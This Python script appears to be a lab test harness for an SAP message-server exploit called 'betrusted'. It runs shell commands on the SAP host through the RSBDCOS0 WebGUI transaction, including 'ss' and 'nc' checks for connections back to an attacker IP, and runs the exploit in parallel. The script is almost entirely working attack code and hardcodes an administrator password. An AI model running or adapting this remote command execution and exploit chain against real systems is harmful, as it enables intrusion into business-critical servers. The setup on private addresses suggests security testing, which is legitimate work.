#!/usr/bin/env python3
"""
Focused test: monitor network connections from SAP server to attacker during exploit.

Uses WebGUI RSBDCOS0 to run 'ss -tn dst 192.168.2.210' on the SAP server
while the exploit runs. This tells us if SAP ever tries to connect to our
NILIST listener.
"""

import sys, os, time, re, json, threading, socket, struct
import requests, urllib3, urllib.parse
urllib3.disable_warnings()

sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_ms_betrusted import (
    betrusted, _start_nilist_listener, build_nilist_port_reply,
    _wait_and_reply_nilist, ms_build_header, ms_parse_header,
    pkt_login_2, pkt_mod_state, build_dp_info,
    ni_send, ni_recv,
    _HEADER_LEN, _ADM_HDR_LEN, _ADM_REC_SIZE, _ADM_EYE,
    FLAG_ONE_WAY, FLAG_REQUEST, FLAG_REPLY, FLAG_ADMIN,
    IFLAG_SEND_NAME, IFLAG_LOGIN_2, IFLAG_MOD_STATE,
    MSG_DIA, MSG_DIA_ENQ,
    ADM_GET_NILIST_PORT, ADM_NILIST,
    DEFAULT_DIAG_PORT, DP_VERSION_V14,
    _derive_appserver_name,
)

HOST   = '192.168.2.209'
PORT   = 3901
ATT_IP = '192.168.2.210'
INST   = 1
SID    = 'S4H'
SYSNR  = '00'
CLIENT = '000'
USER   = 'joris'
PASSWD = 'SccAdmin123!'
WEBGUI = f'https://{HOST}:8000'

# ---------- minimal WebGUI helpers ------------------------------------------

def _wg_session(tcode):
    s = requests.Session()
    s.auth = (USER, PASSWD); s.verify = False
    url = (f"{WEBGUI}/sap/bc/gui/sap/its/webgui"
           f"?sap-client={CLIENT}&sap-language=EN"
           f"&~transaction={urllib.parse.quote(tcode)}")
    r = s.get(url, timeout=20)
    if r.status_code != 200: return None,None,None
    fa = re.findall(r'action="([^"]+)"', r.text)
    m  = re.findall(r'var moin\s*=\s*"([^"]+)"', r.text)
    if not fa or not m: return None,None,None
    pu = f"{WEBGUI}{fa[0]}"; mo = m[0]
    r2 = s.post(pu,
        data=(f"sap-charset=utf-8&~SEC_SESSTOKEN={mo}"
              f"&sap-wd-secure-id={mo}&fkey=ENTER&~okcode="),
        headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=20)
    if r2.status_code != 200: return None,None,None
    m2 = re.findall(r"moin:'([^']+)'", r2.text)
    mo = m2[0] if m2 else mo
    return s, pu, mo

def _wg_batch(s, pu, mo, ops):
    bu = f"{pu.rstrip('/')}/batch/json?~RG_WEBGUI=X&sap-statistics=true&~runonsess=1"
    r = s.post(bu, data=json.dumps(ops),
               headers={"Content-Type": "application/json", "moin": mo}, timeout=30)
    if r.status_code != 200: return mo, r.text
    m = re.findall(r"moin:'([^']+)'", r.text)
    return m[0] if m else mo, r.text

def exec_cmd(cmd, timeout_s=20):
    """Execute shell command via RSBDCOS0 and return raw WebGUI response text."""
    s, pu, mo = _wg_session("*SE38 RS38M-PROGRAMM=RSBDCOS0;DYNP_OKCODE=strt")
    if not s:
        return None
    mo, resp = _wg_batch(s, pu, mo, [
        {"post": "value/wnd[0]/usr/txt[0,8]", "content": cmd},
        {"post": "vkey/8/ses[0]"},
        {"get": "state/ur"},
    ])
    return resp

def extract_screen_text(resp):
    """Extract screen field values from WebGUI batch response."""
    if not resp:
        return ""
    # Values appear as escaped strings in the batch JSON response
    # Look for content fields and list items
    found = []
    # Extract text node content
    for m in re.finditer(r'"(?:content|text|value)"\s*:\s*"((?:[^"\\]|\\.)*)"', resp):
        v = m.group(1).replace('\\n', '\n').replace('\\t', '\t').replace('\\"', '"')
        if len(v) > 3 and not v.startswith('<?'):
            found.append(v)
    if found:
        return '\n'.join(found)
    # Fallback: strip HTML
    text = re.sub(r'<[^>]+>', ' ', resp)
    text = re.sub(r'\s{2,}', '\n', text)
    return text

# ---------- the core test ----------------------------------------------------

def monitor_connections():
    """Poll SAP server every 2s to check if it connects to our IP."""
    print("[MON] Starting connection monitor (polling every 3s)...")
    found_ports = set()
    for _ in range(50):  # 50 * 3s = 150 seconds
        resp = exec_cmd(f"ss -tn dst {ATT_IP} 2>/dev/null; echo ---END---")
        if resp:
            text = extract_screen_text(resp)
            # look for ESTABLISHED connections to our IP
            if ATT_IP in text:
                new_lines = [l for l in text.split('\n')
                             if ATT_IP in l and l not in found_ports]
                for l in new_lines:
                    print(f"[MON] SAP→ATTACKER connection: {l.strip()}")
                    found_ports.add(l)
        time.sleep(3)
    print("[MON] Monitor done.")


def run_exploit():
    """Run betrusted with verbose logging and a longer hold."""
    print("[EXP] Starting betrusted exploit...")
    result = betrusted(
        host=HOST, port=PORT, attacker_ip=ATT_IP,
        instance_nr=INST, our_name='', target_sid=SID,
        nilist_wait=120,   # wait 2 minutes for NILIST
        dp_version=14,
        kernel_new=True,
        verbose=False,
    )
    print(f"[EXP] betrusted result: {result}")
    return result


def check_nilist_listener_port():
    """Bind a test listener on a well-known port and check if SAP connects."""
    port = 9999
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    srv.settimeout(60)
    print(f"[TEST] Listening on 0.0.0.0:{port}")

    # Ask SAP to connect
    print(f"[TEST] Asking SAP to connect to {ATT_IP}:{port} via RSBDCOS0 nc...")
    resp = exec_cmd(f"nc -z -w2 {ATT_IP} {port} && echo 'CONNECTED' || echo 'FAILED'")
    text = extract_screen_text(resp)
    print(f"[TEST] SAP nc result: {text[:200]}")

    srv.close()


def main():
    print("=" * 70)
    print(" NILIST Listener Monitor Test")
    print("=" * 70)
    print()

    # First: confirm connectivity from SAP to a fixed port
    print("[1] Testing connectivity: SAP → 192.168.2.210:9999")
    check_nilist_listener_port()
    print()

    # Second: monitor current SAP connections to our IP
    print("[2] Current SAP connections to our IP (baseline):")
    resp = exec_cmd(f"ss -tn dst {ATT_IP} 2>/dev/null; echo '=END='")
    if resp:
        t = extract_screen_text(resp)
        print(f"    {t[:500] if t else '(empty)'}")
    print()

    # Third: run exploit + monitor in parallel
    print("[3] Starting exploit + parallel connection monitor...")
    exploit_done = threading.Event()
    exploit_result = {}

    def _exp():
        r = run_exploit()
        exploit_result.update(r)
        exploit_done.set()

    exp_thread = threading.Thread(target=_exp, daemon=True)
    mon_thread = threading.Thread(target=monitor_connections, daemon=True)

    exp_thread.start()
    time.sleep(5)   # wait for exploit to register first
    mon_thread.start()

    # Wait for exploit to finish
    exp_thread.join(timeout=180)
    print()
    print(f"[3] Exploit done: {exploit_result}")
    print()

    # Give some extra time for any delayed NILIST connections
    print("[4] Waiting 30s for any delayed NILIST connections...")
    time.sleep(30)

    # Final check: any new connections?
    print("[5] Final SAP connections to our IP:")
    resp = exec_cmd(f"ss -tn dst {ATT_IP}; echo '=END='")
    if resp:
        t = extract_screen_text(resp)
        print(f"    {t[:500] if t else '(empty)'}")

    print()
    print("[*] Done.")


if __name__ == '__main__':
    main()
